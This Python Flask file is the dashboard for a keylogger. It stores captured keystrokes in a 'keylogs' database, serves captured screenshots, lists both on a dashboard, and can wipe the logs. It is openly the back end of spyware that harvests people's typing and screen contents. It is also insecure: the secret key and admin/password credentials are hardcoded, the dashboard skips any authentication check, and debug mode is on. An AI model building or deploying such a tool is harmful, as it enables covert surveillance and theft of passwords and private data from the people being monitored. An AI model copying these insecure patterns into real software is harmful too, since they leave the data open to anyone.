from flask import Flask, render_template, request, redirect, url_for, flash
from flask import send_from_directory
import sqlite3
import os

app = Flask(__name__)
app.secret_key = 'shhhThisIsASecret'  

def init_db():
    try:
        conn = sqlite3.connect('./keylogs.db')
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS keylogs (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            date TEXT,
                            time TEXT,
                            key TEXT
                        )''')
        conn.close()
    except sqlite3.Error as e:
        print(f"Error initializing database: {e}")
    finally:
        conn.close()


@app.route('/screenshots/<filename>')
def serve_screenshot(filename):
    return send_from_directory('captured_screenshots', filename)


@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    if username == 'admin' and password == 'password':
        return redirect(url_for('dashboard'))
    else:
        flash('Invalid credentials. Please try again.', 'danger')
        return redirect(url_for('home'))

@app.route('/dashboard')
def dashboard():
    # Fetch keylogs from the database
    conn = sqlite3.connect('./keylogs.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM keylogs')
    keylogs = cursor.fetchall()
    conn.close()

    # List all screenshots in the directory
    screenshot_dir = './captured_screenshots'
    screenshots = [
        f for f in os.listdir(screenshot_dir) 
        if os.path.isfile(os.path.join(screenshot_dir, f))
    ]

    return render_template('dashboard.html', keylogs=keylogs, screenshots=screenshots)



@app.route('/delete_all', methods=['POST'])
def delete_all():
    try:
        conn = sqlite3.connect('./keylogs.db')
        cursor = conn.cursor()
        cursor.execute('DELETE FROM keylogs')
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        flash(f'Error deleting entries: {e}', 'danger')
    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    init_db()
    app.run(debug=True)
